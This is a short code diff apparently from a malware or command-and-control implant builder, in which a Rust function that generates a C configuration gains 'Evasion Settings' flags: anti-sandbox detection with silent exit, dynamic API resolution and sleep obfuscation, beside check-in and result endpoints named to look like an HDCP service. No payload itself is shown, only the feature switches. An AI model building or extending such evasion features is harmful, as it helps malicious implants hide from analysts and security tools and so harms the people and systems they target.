@@ -329,6 +329,12 @@ fn generate_c_config(request: &BuildRequest) -> String {
 #define API_CHECKIN "/api/CpHDCPSvc"
 #define API_RESULT "/api/CpHDCPSvc"
 
+// === Evasion Settings ===
+#define ENABLE_EVASION 1      // Anti-sandbox detection
+#define EVASION_EXIT_SILENT 1 // Exit silently if sandbox detected
+#define ENABLE_DYNAPI 1       // Dynamic API resolution
+#define ENABLE_SLEEP_OBF 1    // Sleep obfuscation
+
 // Debug mode (set to 0 to disable all console output)
 #define DEBUG_MODE 0
 
